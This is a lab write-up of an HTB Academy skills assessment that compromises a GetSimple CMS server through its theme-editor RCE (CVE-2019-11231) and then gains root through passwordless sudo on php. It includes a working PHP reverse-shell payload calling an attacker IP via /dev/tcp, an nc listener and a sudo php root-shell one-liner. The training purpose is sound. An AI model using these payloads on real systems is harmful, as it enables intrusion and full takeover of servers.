---
title: "HTB Academy: Getting Started — GetSimple CMS RCE to Root"
date: 2026-08-04
---

## Overview

- **Module:** HTB Academy — Getting Started (final skills assessment)
- **Target OS:** Linux (Ubuntu)
- **Difficulty:** Beginner
- **Vulnerabilities:** CVE-2019-11231 (GetSimple CMS Theme Editor RCE), sudo misconfiguration (`/usr/bin/php` as `NOPASSWD`)

## Recon

```
nmap -sV -sC 10.129.88.95
```

Results:
- `22/tcp` — OpenSSH 8.2p1 (Ubuntu)
- `80/tcp` — Apache 2.4.41, `http-title`: "Welcome to GetSimple! - gettingstarted", `http-robots.txt` flagged `/admin/` as a disallowed entry

![nmap scan results](/images/gettingstarted/nmap.png)

Accessed the target directly via its IP for the rest of the assessment.

## Enumeration

```
gobuster dir -u http://10.129.88.95 -w /usr/share/wordlists/dirb/common.txt
```

Notable hits:
- `/admin/` → GetSimple CMS login
- `/data/`  → Found the admin username and password
- `/theme/`, `/plugins/`, `/backups/`

![gobuster directory enumeration](/images/gettingstarted/gobuster.png)

Site identified as **GetSimple CMS**. Logged into `/admin/` with default/guessed creds (`admin:admin`).

## Foothold — CVE-2019-11231

GetSimple CMS's **Theme Editor** allows an authenticated admin to edit theme PHP files directly and save them without sanitization — this is CVE-2019-11231, an authenticated RCE.

**Steps:**
1. Navigate to Theme → Edit → `template.php` (Innovation theme)
2. Inject a reverse shell payload above the existing template code:

```php
<?php if(!defined('IN_GS')){ die('you cannot load this page directly.'); }
system("bash -c 'bash -i >& /dev/tcp/10.10.15.176/9001 0>&1'");
?>
```

3. Save changes

![Theme Editor with reverse shell payload injected](/images/gettingstarted/theme-editor.png)

4. Start a listener:
```
nc -lvnp 9001
```
5. Trigger execution by requesting the site homepage:
```
curl http://10.129.88.95/
```

Shell received as `www-data`.

## User Flag

```
find / -iname "user.txt" 2>/dev/null
```

Found at `/home/mrb3n/user.txt`.

```
cat /home/mrb3n/user.txt
```

Flag: `[REDACTED]`

![Reverse shell landing as www-data, finding and reading user.txt](/images/gettingstarted/foothold-flag.png)

## Privilege Escalation

Stabilized the shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Checked sudo permissions:
```
sudo -l
```

Result:
```
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

`php` has no restrictions on the code it runs, so it can be used to spawn a root shell via its `system()` function:

```
sudo /usr/bin/php -r 'system("/bin/bash");'
```

`-r` executes a one-liner instead of dropping into PHP's interactive REPL; `system()` then spawns `/bin/bash` as a subprocess, which inherits root privileges from the `sudo`-elevated PHP process.

```
id
```
```
uid=0(root) gid=0(root) groups=0(root)
```

![sudo -l output and PHP privesc landing as root](/images/gettingstarted/privesc.png)

## Root Flag

```
cat /root/root.txt
```

Flag: `[REDACTED]`

![Reading root.txt as root](/images/gettingstarted/root-flag.png)

## Lessons Learned

- Known CVEs against CMS platforms are worth checking immediately once the software/version is fingerprinted — no need to reinvent an exploit that's already documented.
- `sudo -l` should be one of the first commands run after gaining any foothold — it's often the fastest path to privesc.
- Interpreted-language binaries (PHP, Python, Perl, etc.) granted passwordless sudo access are almost always an instant root path, since they can shell out via built-in functions (`system()`, `exec()`, `os.system()`, etc.). Worth checking [GTFOBins](https://gtfobins.github.io/) for any binary that shows up in `sudo -l`.